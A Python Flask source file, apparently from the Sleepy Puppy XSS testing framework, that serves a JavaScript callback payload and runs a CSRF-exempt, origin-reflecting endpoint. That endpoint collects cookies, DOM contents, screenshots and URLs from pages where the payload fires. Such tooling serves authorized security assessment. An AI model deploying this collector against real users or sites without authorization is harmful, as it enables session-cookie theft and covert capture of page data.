import urllib
from flask import request
from flask import render_template
from flask_mail import Message
from sleepypuppy import app, db, flask_mail, csrf_protect
from sleepypuppy.admin.payload.models import Payload
from sleepypuppy.admin.capture.models import Capture
from sleepypuppy.admin.user.models import User
from flask import Response

@app.route('/x', methods=['GET'])
def x_collector(xss_uid=1):
    """
    shortcut for collector()
    """
    return collector(request.args.get('u', 1))

@app.route('/c.js', methods=['GET'])
def collector(xss_uid=1):
    """
    Render Javascript payload with unique identifier and hosts for callback.
    """
    xss_uid = request.args.get('u', 1)
    return render_template(
        'c.js',
        xss_uid=xss_uid,
        hostname=app.config['CALLBACK_HOSTNAME'],
        callback_protocol=app.config.get('CALLBACK_PROTOCOL', 'https')
    )


def email_subscriptions(xss_uid, url):
    """
    Email all users who are subscribed to assessments.
    """
    email_list = []
    notify_jobs = Payload.query.filter_by(id=xss_uid).first()
    user_notify = User.query.all()
    # Loop through every User and intersect if the capture is associated with
    # an assessment they are subscribed to recieve notificaitons for.
    for user in user_notify:
        user_subscriptions = []
        for assessment in user.assessments:
            user_subscriptions.append(assessment.id)
        if len(set(notify_jobs.show_assessment_ids()).intersection(user_subscriptions)) > 0:
            email_list.append(user.email)

    # If there are people to email, email them that a capture was recieved
    if email_list:
        msg = Message(
            "[Sleepy Puppy] - Capture Recieved From: {}".format(url),
            sender=app.config['MAIL_SENDER'],
            recipients=email_list
        )
        msg.html = "<b>Associated Assessments: <b>{}<br><br>".format(notify_jobs.show_assessment_names())
        flask_mail.send(msg)


# Disable CSRF protection on callback posts
@csrf_protect.exempt
@app.route('/callbacks', methods=['POST', 'GET'])
def get_callbacks():
    """
    Method to handle Capture creation.
    """
    response = Response()
    response.headers.add('Access-Control-Allow-Origin', request.headers.get("Origin", None))
    response.headers.add('Access-Control-Allow-Methods', 'GET,POST')
    response.headers.add('Access-Control-Max-Age', '21600')
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    response.headers.add('Access-Control-Allow-Headers', "Origin, X-Requested-With, Content-Type, Accept")

    app.logger.info("Inside /callbacks")

    if request.method == 'POST':

        try:
            app.logger.info("request.form.get('xss_uid', 0): {}".format(request.form.get('xss_uid', 0)))

            url = urllib.unquote(unicode(request.form.get('uri', '')))
            referrer = urllib.unquote(unicode(request.form.get('referrer', '')))
            cookies = urllib.unquote(unicode(request.form.get('cookies', '')))
            user_agent = urllib.unquote(unicode(request.form.get('user_agent', '')))
            assessment = Payload.query.filter_by(id=int(request.form.get('xss_uid', 0))).first()
            xss_uid = assessment # what the heck
            # Payload.query.filter_by(id=int(request.form['xss_uid'])).first()
            screenshot = unicode(request.form.get('screenshot', ''))
            dom = urllib.unquote(unicode(request.form.get('dom', '')))[:65535]

            # If it's a rogue capture, log it anyway.
            if assessment is None:
                client_info = Capture("Not found", url, referrer, cookies, user_agent, 1, screenshot, dom)
            else:
                # Create the capture with associated assessment/payload
                client_info = Capture(assessment.id, url, referrer, cookies, user_agent, xss_uid.id, screenshot, dom)
                email_subscriptions(xss_uid.id, url)

            db.session.add(client_info)
            db.session.commit()
        except Exception as e:
            app.logger.warn("Exception in /callbacks {}\n\n{}".format(Exception, str(e)))
            import traceback
            traceback.print_exc()

    return response
